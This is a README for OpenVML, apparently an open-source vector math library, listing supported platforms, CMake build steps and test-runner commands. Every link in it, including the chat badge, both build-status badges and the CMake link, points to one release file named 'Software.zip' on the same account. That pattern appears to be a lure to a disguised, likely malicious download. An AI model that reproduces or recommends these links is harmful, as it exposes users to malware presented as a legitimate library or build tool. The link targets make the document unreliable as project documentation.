# OpenVML

[![Join the chat at https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)
Travis CI:[![Build Status](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)
AppVeyor:[![Build Status](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)

OpenVML is an open soruce vector math library.

## Support Processors and OS

* Generic platform
  * C and unoptimized codes

* OS
  * Linux
  * Mac OSX
  * Windows (Visual Studio or MinGW)

* x86_64
  * Intel Sandy Bridge
  * Intel Haswell

* ARM
  * ARMv7 (Cortex-A9, Cortex-A15)

## Compile

You need (CMake)[https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip] on your platform.

* Linux or Mac OSX:

```
mkdir /your/build
cd /your/build
cmake /path/to/OpenVML
make
make install
```

* Visual Studio
 * Need MS Visual Studio 2013 and above.
 * Use cmake or cmake-gui to generate Visual Studio solution files.
 * Use Visual Studio to open the solution and build.

## Test

 * Check the result and Performance

   Run `/your/build/test/run_vml_test`.
   For exmaple,
   ```
   ./run_vml_test                          # Run all test
   ./run_vml_test  -r check_result_s       # Only run single precision functions.
   ./run_vml_test  -r check_result_s add   # Only run single precision add function (vsAdd).
   ./run_vml_test  -n 1 10 2               # The input sizes are from 1 to 10, step 2.
   ```

 * Misc test

   Run `/your/build/test/misc_test`.

## Status

Ongoing work
